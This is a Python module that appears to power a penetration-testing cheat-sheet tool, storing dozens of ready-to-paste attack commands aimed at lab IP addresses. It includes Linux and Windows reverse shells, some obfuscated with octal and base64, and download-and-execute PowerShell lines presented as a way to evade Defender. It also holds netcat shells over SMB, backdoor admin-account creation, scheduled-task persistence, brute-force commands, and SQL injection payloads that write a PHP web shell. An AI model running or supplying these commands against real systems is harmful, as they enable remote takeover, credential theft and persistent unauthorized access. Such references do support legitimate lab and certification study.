# pylint: disable=all

import os

from .cheat import Cheat
from .color import Color


# Global functions
def get_ip():
    ip = (
        os.popen(
            """/bin/ip add | grep "tun0" | grep "inet" | tr "/" " " | awk '{print$2}'"""
        )
        .read()
        .strip()
    )
    if ip in "":
        ip = "x.x.x.x"
    return ip


def create_new_cheat(name):
    cheat = Cheat(name)
    cheat_list.append(cheat)
    return cheat


# Global variable_name
ip = get_ip()
cheat_list = []


######################################
######################################

PSCredential = create_new_cheat("PSCredential (runas)")
PSCredential.category = "Windows"
PSCredential.sub_category = "PowerShell"
PSCredential.output = """[*] PSCredential - Create a Credential Object for PowerShell (runas):

# Create Secure password and execute a command with other user
$user = 'hostname\\user'
$pw = 'password'
$secure_pw = ConvertTo-SecureString $pw -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user, $secure_pw
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }

# Get the password from a Secure password
(Import-CliXml -Path user.txt).GetNetworkCredential().password
# or
$cred.getNetworkCredential() | fl
"""

######################################
######################################

icmp_reverse_shell_windows = create_new_cheat(
    "ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
)
icmp_reverse_shell_windows.category = "Windows"
icmp_reverse_shell_windows.sub_category = "Reverse Shell"
icmp_reverse_shell_windows.output = """[*] Reverse Shell when TCP and UDP connection are blocked by Firewall rules.

# 1 - Download Nishang
# 2 - Remove all blank lines and commented lines for no bugs
# 3 - Convert reverseShell File => bytes => base64
# 4 - Convert "+" and "=" symboles into "%2B" and "%3D" respectively (prevents UrlEncode errors)
# 5 - Split the long String (in base64) to small lines (80 chars) for not excede url capacity
# 6 - Send file splitted in multiples part to the target
# 7 - Decode the new file in target machine AND execute

# - 2 on kali
cat IP_icmp.ps1 | sed '/^\s*$/d' > new_IP_icmp.ps1

# - 3 on kali
pwsh
$fileContent = Get-Content -Raw ./new_IP_icmp.ps1
$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
$encoded = [Convert]::ToBase64String($bytes)
$encoded | Out-File new_IP_icmp.ps1.b64
exit

#OR simplesly
IP_icmp.ps1 | iconv --to-code UTF-16LE | base64 -w0


# - 4 on kali
cat new_IP_icmp.ps1.b64 | sed 's/+/%2B/g' | sed 's/=/%3D/g'

# - 5 on kali
fold -w 80 new_IP_icmp.ps1.b64 > final_IP_icmp.ps1.b64

# - 6 on kali
for line in $(cat icmp.ps1.b64); do cmd="echo ${line} >> C:\Temp\shell.ps1"; curl -s -X GET -G "http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx" --data-urlencode "xcmd=$cmd"; done

# - 7 on target machine
$file = Get-Content -Raw C:\Temp\shell.ps1
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
$decoded > C:\Temp\pwned.ps1
powerShell C:\Temp\pwned.ps1
"""

######################################
######################################

check_priv_file = create_new_cheat("cacls.exe - Check Privilege of a file")
check_priv_file.category = "Windows"
check_priv_file.sub_category = "Utility"
check_priv_file.output = """[*] Check Privilege of a file like ls -lArth in Linux.
cacls C:\PATH\File.ext
"""

######################################
######################################

alternative_data_streams = create_new_cheat(
    "Alternate Data Streams (MetaData), hide file in a file"
)
alternative_data_streams.category = "Windows"
alternative_data_streams.sub_category = "Utility"
alternative_data_streams.output = """[*] Check for hide data in a file (like stenography for images)

# List all available data streams
Get-Item -Path C:\Temp\\backup.zip -stream *

# (Stdout)	    FileName: C:\Temp\backup.zip
# (Stdout)	
# (Stdout)	 Stream                   Length    
# (Stdout)	 ------                   ------
# (Stdout)	 :$DATA                   103297
# (Stdout)	 pass                         34

# Extract the data
type C:\Temp\\backup.zip:pass
"""

######################################
######################################

firewall_rules_change_to_accept_IP_Attacker = create_new_cheat(
    "Create new local user with administrator privilege - Firewall Rules - PostExploit"
)
firewall_rules_change_to_accept_IP_Attacker.category = "Windows"
firewall_rules_change_to_accept_IP_Attacker.sub_category = "PostExploit"
firewall_rules_change_to_accept_IP_Attacker.output = """[*] Create new local user with administrator privilege...

# Add a new user and assign him as Administrators group for highest local privilege
net user javali J4val1*! /add
net localgroup Administrators javali /add


[*] Manage Firewall and other things

# Add an IP to target firewall rules to accept traffic from UDP and TCP (Need administrator privileges) (PS)
New-NetFirewallRule -DisplayName pwned -RemoteAddress 10.10.14.53 -Direction inbound -Action Allow

# Add permission to execute command from out of the local system (cmd)
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# Open Ports (cmd)
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=in localport=445 action=allow
netsh advfirewall firewall add rule name="Samba Port" protocol=TCP dir=out localport=445 action=allow

# Don't know what he do loool. But is importante... need to check...
net share attacker_folder=C:\\Windows\Temp /GRANT:Administrators,FULL
"""

######################################
######################################

evil_winrm = create_new_cheat(
    "Evil-winrm - (Web Service Management Protocol WS-Management) "
)
evil_winrm.category = "Windows"
evil_winrm.sub_category = "WinRM"
evil_winrm.output = """[*] Evil-winrm - Automated tool to bind stable shell when WS-Management Protocol is active an open and we have correct credentials

gem install evil-winrm
evil-winrm -i 10.10.10.57 -u 'administrator' -p '1234test'
"""

######################################
######################################

snmpwalk = create_new_cheat("snmpwalk - onesixtyone - 161 UDP - Comunity string - SNMP")
snmpwalk.category = "Tools"
snmpwalk.sub_category = "SNMP"
snmpwalk.output = """[*] Even if port 161 is filtered or pointed to closed, this tool can find out if port 161 UDP is operational.

onesixtyone 10.10.10.116



[*] snmpwalk - retrieve a subtree of management values using SNMP GETNEXT requests.

snmpwalk -c public -v2c 10.10.10.116 > contents/snmpwalk.out


[*] snmp-check - 161 - SNMP Enumerator

snmp-check [OPTIONS] <target IP address>
  -p --port        : SNMP port. Default port is 161;
  -c --community   : SNMP community. Default is public;
  -v --version     : SNMP version (1,2c). Default is 1;
"""

######################################
######################################

ike_scan = create_new_cheat("ike-scan - 500 UDP - IPsec VPN / ipsec - strongSwan (VPN)")
ike_scan.category = "Tools"
ike_scan.sub_category = "VPN"
ike_scan.output = """[*] ike-scan - Discover and fingerprint IKE hosts (IPsec VPN servers)

# ver vídeo - HackTheBox | Conceal [OSCP Style] (TWITCH LIVE)
# https://www.youtube.com/watch?v=RtztYLMZMe8&list=PLWys0ZbXYUy7GYspoUPPsGzCu1bdgUdzf&t=3187s

ike-scan 10.10.10.116 -M

# Connect to de VPN
sudo restart ipsec
"""

######################################
######################################

file_transfere_windows_iwr = create_new_cheat(
    "File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
)
file_transfere_windows_iwr.category = "Windows"
file_transfere_windows_iwr.sub_category = "File Transfere"
file_transfere_windows_iwr.output = """[*] Simple File Transfere for Windows with PowerShell

# simple download
powerShell -c "Invoke-WebRequest -Uri 'http://10.10.14.53:80/nc.exe' -OutFile 'C:\Temp\\nc.exe'"

# Donwload and execute directly in RAM (Escape Windows Defender)
powerShell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')
start /b C:\\Windows\SysNative\WindowsPowerShell\\v1.0\powerShell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"

start /b C:\\Windows\SysWOW64\WindowsPowerShell\\v1.0\powerShell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).downloadString('http://10.10.14.53:80/IP.ps1')"

# Certutil.exe
certutil -urlcache -f http://10.10.14.53:80/nc.exe C:\Temp\\nc.exe

"""

######################################
######################################

file_transfere_windows_smbserver = create_new_cheat(
    "File Transfere Windows - SmbServer.py (Impacket)"
)
file_transfere_windows_smbserver.category = "Windows"
file_transfere_windows_smbserver.sub_category = "File Transfere"
file_transfere_windows_smbserver.output = """[*] Create Shared Folder by the Internet with SmbServer.py (Impacket)

# On kali
smbserver.py smbFolder $(pwd) -user javali -password javali -smb2support

# On target machine
# Connect to SmbServer with credencial for more compatibility and less bugs
net use \\\\10.10.14.53\smbFolder /u:javali javali
copy \\\\10.10.14.53\smbFolder\\nc64.exe C:\\Windows\Temp\\nc64.exe
# Execute directely without transfere
\\\\10.10.14.53\smbFolder\\nc64.exe -e cmd 10.10.14.53 443
"""

######################################
######################################

oracle_odat = create_new_cheat(
    "odat - Oracle DatabaseAttacking Tools - 1521 TCP oracle-tns"
)
oracle_odat.category = "Tools"
oracle_odat.sub_category = "Databases"

oracle_odat.output = """[*] Powerfull tool to exploit Oracle Database

# Bruteforce SID for next attacks...
odat sidguesser -s 10.10.10.82

# BruteForce default user and password in format: user/password for odat compatibility
locate oracle | grep pass
cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr " " "/" > passwords.txt
sudo odat passwordguesser -s 10.10.10.82 -d <ValidSID> --accounts-file /path/to/passwords.txt

# Upload a Shell
odat utlfile -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --putFile /Temp shell.exe /path/to/shell.exe --sysdba

# RCE
odat externaltable -s 10.10.10.82 -d <ValidSID> -U "ValidUser" -P "ValidPass" --exec /Temp shell.exe --sysdba
"""

######################################
######################################

crackMapExec = create_new_cheat("crackmapexec - Impacket - 445 TCP")
crackMapExec.category = "Windows"
crackMapExec.sub_category = "Impacket"
crackMapExec.output = """[*] crackmapexec is a swiss army knife for pentesting network! 
[*] available protocols: ssh, winrm, mssql, ldap, smb

# SMB enumeration
crackmapexec smb 10.10.10.193
crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt
crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt --continue-on-success | grep -vi "FAILURE"
crackmapexec smb 10.10.10.193 --shares 
crackmapexec smb 10.10.10.193 --shares -u 'null' -p ''  # When "STATUS_USER_SESSION_DELETED" is showed maybe works

# Check if is valide user and password OR NT hash
crackmapexec smb 10.10.10.192 -u "Administrator" -p "AdminPass"
crackmapexec smb 10.10.10.192 -u "Administrator" -H "7f1e4ff8c6a8e6b6fcae2d9c0572cd62"


# WinRM enumeration - Check if we can get Interactive shell with a valid user
crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
"""

######################################
######################################

cewl = create_new_cheat(
    "cewl - Create a list of password (or something) from all words of a html page"
)
cewl.category = "Tools"
cewl.sub_category = "Password"
cewl.output = """[*] Simple tool to take all word of a html page and create a file

cewl -w passwords.txt http://10.10.10.100/
cewl -w passwords.txt http://10.10.10.100/ --with-numbers
"""

######################################
######################################

smbpasswd = create_new_cheat(
    "smbpasswd - SMB STATUS_PASSWORD_MUST_CHANGE - Impacket - 445 TCP"
)
smbpasswd.category = "Windows"
smbpasswd.sub_category = "Impacket"
smbpasswd.output = """[*] smbpasswd - change a user's SMB password

smbpasswd -r 10.10.10.193 -U "bhult"

"""

######################################
######################################

seLoadDriverPrivilege = create_new_cheat("SeLoadDriverPrivilege /priv")
seLoadDriverPrivilege.category = "Windows"
seLoadDriverPrivilege.sub_category = "PrivEsc via group"

seLoadDriverPrivilege.output = """[*] SeLoadDriverPrivilege - If Enabled... GG! 
[*] https://github.com/limitedeternity/ExploitCapcom
"""

######################################
######################################

reverseSheel = create_new_cheat("Basic and advanced Reverses Shells - Linux")
reverseSheel.category = "Linux"
reverseSheel.sub_category = "Reverse Shell"
reverseSheel.output = """[*] TCP Reverse Shell - Linux

bash -c 'exec sh -i &>/dev/tcp/10.10.14.53/443 <&1'
# Octal ofuscation
echo "bash -c 'exec sh -i &>/dev/tcp/10.10.14.53/443 <&1'" | od -b -An | sed 's/ /\\/g' | tr -d "\n" | xclip -sel clip
printf "\142\141\163\150\040\055\143\040\047\145\170\145\143\040\163\150\040\055\151\040\046\076\057\144\145\166\057\165\144\160\057\061\060\056\061\060\056\061\064\056\065\063\057\064\064\063\040\074\046\061\047\012" | sh

# Base64 ofuscation
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.53/443 <&1'" | base64 -w0 into_clip
echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQzIDwmMScK | base64 -d | bash

[*] UDP Reverse Shell - Linux

bash -c 'exec sh -i &>/dev/udp/10.10.14.53/443 <&1'
"""


######################################
######################################

reverseShell_Win = create_new_cheat("Basic and advanced Reverse Shells - Windows")
reverseShell_Win.category = "Windows"
reverseShell_Win.sub_category = "Reverse Shell"
reverseShell_Win.output = """[*] Simple one liner to get a reverse Shell TCP Windows

powerShell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
"""

######################################
######################################

python_urlEncode = create_new_cheat("UrlEncode - urllib - BeautifulSoup - Python3")
python_urlEncode.category = "Python"
python_urlEncode.sub_category = "Encoding"
python_urlEncode.output = """[*] Convert strings into urlencoded strings for requests

# Don't forgot the " simbole can't be inputed when write cmd.
# Example: echo "test" => ERROR 404
# Example: echo 'test' => test
import urllib

    url = "http://10.10.10.27/admin.php?html="
    cmd = input("[ Fake Shell ] ")
    phpCode = urllib.parse.quote_plus(f'<?php system("{cmd}");?>')
    finalUrl = url + phpCode


[*] Get strings from html easily

from bs4 import BeautifulSoup
    res = requests.post(url, headers=headers, data=data).text
    res = BeautifulSoup(res, 'html.parser')
    res = res.find_all('tbody')[0]
    res = res.get_text().strip()
    print(res)
"""

######################################
######################################

lxd_id = create_new_cheat("Group LXD / Docker")
lxd_id.category = "Linux"
lxd_id.sub_category = "PrivEsc via group"
lxd_id.output = """[*] PrivEsc with LXD / Docker Group...

# Git clone lxd alpine builder from saghul...
git clone https://github.com/saghul/lxd-alpine-builder.git

# Build the Docker (maybe many times...) (Need to be root)
sudo ./build-alpine 
sudo ./build-alpine -a i686

# Transfere new docker to target!
sudo python3 -m http.server 80
wget http://<kali ip>:80/<alpine-name.tar.gz>

# Load the Docker and mount / for see all file with docker root privilege
# lxd init may not be available, but normally is up so... forgot it
lxd init

lxc image import ./<alpine-name.tar.gz> --alias javali
lxc init javali javali-container -c security.privileged=true
lxc config device add javali-container mydevice disk source=/ path=/mnt/root recursive=true
lxc start javali-container
lxc exec javali-container /bin/sh
"""

######################################
######################################

smbclient = create_new_cheat("smbclient - Basics - TCP 445 - cifs-utils (smb mount)")
smbclient.category = "Windows"
smbclient.sub_category = "File Transfere"
smbclient.output = """[*] smbclient - ftp-like client to access SMB/CIFS resources on servers

smbclient -L \\\\\\\\10.10.10.10\\\\                       # Enumera as pastas não ocultas em modo anonymous
smbclient -p 1234 \\\\\\\\10.10.10.10\\\\                  # Especifica uma porta diferente da normal (445)
smbclient \\\\\\\\10.10.10.10\\\\directory                 # Tenta entrar para a pasta "directory" do share SMB
smbclient -k \\\\\\\\10.10.10.10\\\\                       # Kerberos mode
smbclient -U username -N \\\\\\\\10.10.10.10\\\\           # Tenta entrar com username sem password
smbclient -L 10.10.10.10 -U "username%password"
smbclient -W workgroup \\\\\\\\10.10.10.10\\\\

# If they re to much directories and files, just mount them into the kali machine!
apt install cifs-utils
mkdir /mnt/smb
mount -t cifs //10.10.10.10/folder /mnt/smb -o username=username,password=password,domain=WORKGROUP,rw
mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0unting,domain=WORKGROUP,rw
"""

######################################
######################################

manualTcpScanInBash = create_new_cheat("Manual TCP Scan in Bash")
manualTcpScanInBash.category = "Tools"
manualTcpScanInBash.sub_category = "Bash"
manualTcpScanInBash.output = """[*] Manually scan ports in bash when no nmap or similar

for port in $(seq 1 65355); do
    timeout 1 bash -c "echo > /dev/tcp/10.10.10.123/$port" && echo "[*] Open Port => $port" &
done; wait
"""

######################################
######################################

hydraBasics = create_new_cheat("hydra - Login BruteForce")
hydraBasics.category = "Tools"
hydraBasics.sub_category = "BruteForce"
hydraBasics.output = """[*] A very fast network logon cracker which supports many different services

# PRINCIPAL OPTIONS:
# 	-s PORT
# 	-l LOGIN_NAME -L LIST_LOGIN_NAMES
# 	-p PASSWORD -P LIST_PASSWORDS
# 	-C FILE (colon separated "login:pass" format, instead of -L/-P options)
# 	-o FILE (write found login/password pairs to FILE instead of stdout)
# 	-t TASKS (run TASKS number of connects in parallel (default: 16))
# 	-m OPTIONS (module specific options. See hydra -U <module> what  options  are  available.)
# 	-v / -V (verbose mode / show login+pass combination for each attempt)
# 	-f (exit after get first login:password)

export user=Admin
export pass=PaSsW0rD!
export ip=10.10.10.10

hydra -l $user -P ./passwords.txt ftp://$ip -vV -f           # FTP brute force
hydra -l $user -P ./passwords.txt $ip -t 4 ssh -vV -f        # SSH brute force
hydra -P ./passwords.txt -v $ip snmp -vV -f                  # SNMP brute force
hydra -l $user -P ./passwords.txt -f $ip pop3 -vV -f         # POP3 Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -vV -f        # SMTP Brute Force
hydra -t 1 -l $user -P ./passwords.txt $ip smb -vV -f        # SMB Brute Forcing
hydra -L users.txt -P passwords.txt $ip smb -vV -f           # SMB Brute Forcing
hydra -t 1 -l $user -P ./passwords.txt rdp://$ip -vV -f      # Hydra attack Windows Remote Desktop
hydra -L users.txt -P passwords.txt $ip ldap2 -vV -f	     # LDAP Brute Forcing
hydra -L ./users.txt -P ./passwords.txt $ip http-get /admin  # attack http get 401 login with a dictionary

# Post Web Form
hydra -l $user -P ./passwordlist.txt $ip http-post-form "/:username=^USER^&password=^PASS^:F=incorrect"
hydra -l $user -P ./passwordlist.txt $ip -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

# Get form popup login
hydra -l $user -P ./passwordlist.txt $ip http-get /dir/
"""

######################################
######################################

wgetRecursive = create_new_cheat("wget Recursive")
wgetRecursive.category = "Tools"
wgetRecursive.sub_category = "File Transfere"
wgetRecursive.output = """[*] Download recursively all file from simple server via url

# -np (no-parent) -R "string" (remove files with string name... wilcards works)
wget -r http://10.10.10.75/nibbleblog/content/ -np -R "index.html*" 
"""

######################################
######################################

wpscan = create_new_cheat("wpscan - wordpress")
wpscan.category = "Tools"
wpscan.sub_category = "Web"
wpscan.output = """[*] WPScan - WordPress Security Scanner

wpscan --url www.website.com              # Non-intrusive scan
    -t 50                                 # Force 50 threads
    --cookie-string COOKIE                # Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
    --wp-content-dir /DIR                 # Specific correct /path when is not the default
    --wp-plugins-dir /DIR                 # Specific correct /path when is not the default
    --enumerate [OPTIONS]                 # Valid options: vp (Vulnerable plugins),
                                          #                ap (All plugins),
                                          #                p (Plugins),
                                          #                vt (Vulnerable themes),
                                          #                at (All themes),
                                          #                t (Themes),
                                          #                tt (Timthumbs),
                                          #                cb (Config backups),
                                          #                u (User IDs)
                                          # Format: [choice],[choice],[choice],...
    -P, --passwords /path/wordlist.txt    # List of password to brute force. If no --usernames, user enumeration will be run
    -U, --usernames /path/wordlist.txt    # List of usernames to brute force. Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
    --update                              # Update database

# Examples:
wpscan --url www.website.com
wpscan --url www.website.com --passwords /path/wordlist.txt -t 50
wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin
wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin --wp-content-dir custom-content
wpscan --url www.website.com --passwords /path/wordlist.txt --usernames admin --wp-plugins-dir wp-content/custom-plugins
"""

######################################
######################################

mimeChanger = create_new_cheat("Change MIME Type of file")
mimeChanger.category = "Tools"
mimeChanger.sub_category = "Utility"
mimeChanger.output = """[*] Change MIME Type of file...

# https://en.wikipedia.org/wiki/List_of_file_signatures
# This methode will overwrite first bytes...

xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg
"""

######################################
######################################

crontabs = create_new_cheat("Crontabs - Basic enumeration Linux")
crontabs.category = "Linux"
crontabs.sub_category = "Enumeration"
crontabs.output = """[*] Crontabs - Basic enumeration Linux

/dev/shm  # comparável ao c:\\windows\temp
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
"""

######################################
######################################

crontabswindows = create_new_cheat("Crontabs - Set Windows Percistance")
crontabswindows.category = "Windows"
crontabswindows.sub_category = "Percistance"
crontabswindows.output = """[*] Crontabs - Set Windows Percistance

schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\\Users\\Victim\\AppData\\Local\\ncat.exe 172.16.1.100 8100"
"""


######################################
######################################

cron_checker = create_new_cheat("croncheck.sh - Check Diferentes Processes running")
cron_checker.category = "Linux"
cron_checker.sub_category = "Enumeration"
cron_checker.output = """[*] CronCheck.sh - Simple Bash Script to check diferentes processes running on Linux

#!/bin/bash

old=$(ps -eo command)

echo -e "Start at: $(date +%H:%M:%S)"
while true; do
        echo -ne "Now: $(date +%H:%M:%S)\\r"
        new=$(ps -eo command)
        diff <(echo "$old") <(echo "$new") | grep "[\<\>]" | grep -vE "croncheck.sh|command"
        old=$new
done
"""

######################################
######################################

find_and_grep = create_new_cheat(
    "Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)"
)
find_and_grep.category = "Linux"
find_and_grep.sub_category = "Utility"
find_and_grep.output = """[*] Find - Grep for Basic enumeration Linux

# Usernames or Passwords in clear text?! (examples)

grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
grep -Ri "password" .

find / -name "*php" -type f -print0 2>/dev/null | xargs -0 grep -i -n -E "pass|user" | grep -vE ":.*//|:.*\*"

# Permissions

find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
find / -perm -o x -type d 2>/dev/null     # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null | grep -vE "^l|^d"
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null | grep -vE "^l|^d"

find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
"""

######################################
######################################

network = create_new_cheat("network - Basic enumeration Linux")
network.category = "Linux"
network.sub_category = "Enumeration"
network.output = """[*] Basic Network enumeration on Linux

cat /proc/net/tcp
for b in $(cat /proc/net/tcp | grep -v "rem_add" | tr ':' ' ' | awk '{print $4}' | sort -u); do python3 -c "print("0x$b")"; done | sort -u
cat /proc/net/fib_trie
cat /etc/knockd.conf

/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network

cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname

lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w

arp -e
route
/sbin/route -nee

tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 # tcpdump tcp dst [ip] [porta] e tcp dst [ip] [porta]
"""

######################################
######################################

capabilities = create_new_cheat(
    "Capabilities - setcap / getcap / setuid - Basic enumeration Linux"
)
capabilities.category = "Linux"
capabilities.sub_category = "Enumeration"
capabilities.output = """[*] Capabilities - setcap / getcap / setuid

getcap -r / 2>/dev/null               # python with that can easily convert user to root.
                                      # import os; os.setuid(0), os.system("/bin/bash")
setcap cap_setuid+ep /path/to/binary  # set uid for scale faster praticaly invisible!
"""


######################################
######################################

findSubDomain_dns = create_new_cheat(
    "nslookup / dig / dnsenum / virtual hosts - Get SubDomain - DNS"
)
findSubDomain_dns.category = "Tools"
findSubDomain_dns.sub_category = "DNS"
findSubDomain_dns.output = """[*] Some tools to find sub domains...

nslookup
    > server 10.10.10.13
    > 10.10.10.13

dig @10.10.10.123 friendzone.red axfr
dnsenum --server 10.10.10.224 --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
host -t axfr friendzone.red 10.10.10.123

wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.forwardslash.htb" http://forwardslash.htb/

"""

######################################
######################################

mysqlBasicAndSqlInjection = create_new_cheat("MySQL / SqlInjection")
mysqlBasicAndSqlInjection.category = "Tools"
mysqlBasicAndSqlInjection.sub_category = "Databases"
mysqlBasicAndSqlInjection.output = """[*] Command                                                      # Description

[*] General

mysql -u root -h docker.hackthebox.eu -P 3306 -p                 # login to mysql database

SHOW DATABASES                                                   # List available databases
USE users                                                        # Switch to database

[*] Tables

CREATE TABLE logins (id INT, ...)                                # Add a new table
SHOW TABLES                                                      # List available tables in current database
DESCRIBE logins                                                  # Show table properties and columns
INSERT INTO table_name VALUES (value_1,..)                       # Add values to table
INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)  # Add values to specific columns in a table
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>   # Update table values

[*] Columns

SELECT * FROM table_name                                 # Show all columns in a table
SELECT column1, column2 FROM table_name                  # Show specific columns in a table
DROP TABLE logins                                        # Delete a table
ALTER TABLE logins ADD newColumn INT                     # Add new column
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn  # Rename column
ALTER TABLE logins MODIFY oldColumn DATE                 # Change column datatype
ALTER TABLE logins DROP oldColumn                        # Delete column

[*] Output

SELECT * FROM logins ORDER BY column_1              # Sort by column
SELECT * FROM logins ORDER BY column_1 DESC         # Sort by column in descending order
SELECT * FROM logins ORDER BY column_1 DESC, id ASC # Sort by two-columns
SELECT * FROM logins LIMIT 2                        # Only show first two results
SELECT * FROM logins LIMIT 1, 2                     # Only show first two results starting from index 2
SELECT * FROM table_name WHERE <condition>          # List results that meet a condition
SELECT * FROM logins WHERE username LIKE 'admin%'   # List results where the name is similar to a given string

[*] MySQL Operator Precedence

# Division (`/`), Multiplication (`*`), and Modulus (`%`)
# Addition (`+`) and Subtraction (`-`)
# Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
# NOT (`!`)
# AND (`&&`)
# OR (`||`)

[*] SQL Injection
[*] Payload                                        # Description

# Auth Bypass

admin' or '1'='1                                   # Basic Auth Bypass
admin')-- -                                        # Basic Auth Bypass With comments

[*] Usefull Functions

group_concat(<value>)                              # Concat every values in a long string separated by a comma

[*] Union Injection

' order by 1-- -                                   # Detect number of columns using `order by`
cn' UNION select 1,2,3-- -                         # Detect number of columns using Union injection
cn' UNION select 1,@@version,3,4-- -               # Basic Union injection
UNION select username, 2, 3, 4 from passwords-- -  # Union injection for 4 columns

[*] DB Enumeration

SELECT @@version                                   # Fingerprint MySQL with query output
SELECT SLEEP(5)                                    # Fingerprint MySQL with no output
cn' UNION select 1,database(),2,3-- -              # Current database name

# List all databases
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
# List all tables in a specific database
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
# List all columns in a specific table
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -    
# Dump data from a table in another database               
cn' UNION select 1, username, password, 4 from dev.credentials-- -

[*] Privileges

# Find current user
cn' UNION SELECT 1, user(), 3, 4-- -    
# Find if user has admin privileges               
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
# Find if all user privileges
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -
# Find which directories can be accessed through MySQL  
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

[*] File Injection

# Read local file
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
# Write a string to a local file
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
# Write a web shell into the base web directory
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
"""

######################################
######################################

